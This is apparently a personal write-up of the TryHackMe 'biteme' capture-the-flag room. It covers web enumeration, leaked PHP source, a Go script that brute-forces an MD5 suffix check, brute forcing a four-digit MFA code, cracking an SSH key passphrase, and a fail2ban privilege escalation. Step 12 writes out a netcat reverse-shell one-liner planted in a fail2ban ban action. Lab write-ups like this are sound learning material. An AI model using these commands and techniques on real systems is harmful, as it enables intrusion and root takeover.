# biteme

https://tryhackme.com/room/biteme

This was quite a fun room! Took a while to get the foothold, then root was non trivial, in both cases because I had to learn something! Best kind of room.

1. Initial scans revealed only 22 and 80. On 80, there was just the default page; a quick ffuf revealed `/console` as where the action was going to happen.
2. At `/console/index.php` I needed to enter a username and password, along with a captcha. The Captcha seemed legitimate, using PHP securimage, meaning brute forcing this login would be impossible, or at least very difficult.
3. However, there was some curious Javascript in the page that would post a log message just before submitting (so you wouldn't see it unless interception is on in burp):

  ```html
  <script>
  function handleSubmit() {
    eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'2\').3=\'4\';5.6(\'@7 8 9 a b c d e f g h i... j\');',20,20,'document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason'.split('|'),0,{}))
    return true;
  }
  </script>
  ```
  
The message was 'fred, i turned on php file syntax highlighting for you to review'. Reading up on this, this was a thing in PHP where functions highlight_file and highlight_string could be used to render a PHP file with syntax highlighting. When the output is saved as a file, typically the PHPS extension is used.

4. I used ffuf again to search to phps files, and found the `index.phps`, `config.phps` and `functions.phps`. These revealed that there was a single valid username, and that the password would only be checked insofar that it's md5hash must end with `001`.

5. I wrote a quick go script to compute a possible password value:

  ```go
  package main

  import (
    "crypto/md5"
    "fmt"
    "strings"
  )

  func main() {
    n := 1
    for true {
      toTest := fmt.Sprintf("%d", n)
      result := fmt.Sprintf("%x", md5.Sum([]byte(toTest)))
      if strings.HasSuffix(result, "001") {
        fmt.Println(toTest)
        break
      }
      n++
    }
  }
  ```
  
  With the output of this and the username I was able to login, being redirected to `mfa.php`.
  
6. For mfa.php, there was no phps file. It asked for a four digit code that had been 'sent to my email'. Looking around, another log message was briefly posted on submit just like with the login page. This one said 'we need to implement brute force protection'.
7. I used burp intruder to brute force this form with all values from `0000` to `9999`. This got me past this page.
8. The final webpage, the `dashboard.php`, allowed me to view and read files from the filesystem, presumably limited to the jason user's permissions. I located and read a private SSH key for jason.
9. The key was encrypted, so using `ssh2john.py`, john the ripper and the rockyou wordlist I searched for and found the passphrase. I was then able to SSH in as john and get the first flag.
10. John could run ALL as root, but I needed his password. However, he could also run ALL as Fred without a password so I switched to fred with `sudo -u fred -i`
11. Fred could restart the fail2ban service, which was running as root. I didn't know much about this, but had a vague memory of being able to customise actions used by fail2ban.
12. Enumerating the /etc/fail2ban/action.d folder, I found `iptables-multiport.conf` was owned by Fred. In here, I changed the actionban action (I tried using actionstart but it didnt work) to invoke a reverse shell back to my attack box:

  ```
  # Option:  actionban
  # Notes.:  command executed when banning an IP. Take care that the
  #          command is executed with Fail2Ban user rights.
  # Tags:    See jail.conf(5) man page
  # Values:  CMD
  #
  actionban = rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.128.47 4444 >/tmp/f
  ```

14. Restarting fail2ban, I started another terminal on my attack box and repeated attempted to log in over ssh with nonsense passwords. After my second try, the ban action was triggered and I got a reverse shell as root :)

So yes, quite a twisty room, with some good learnings!
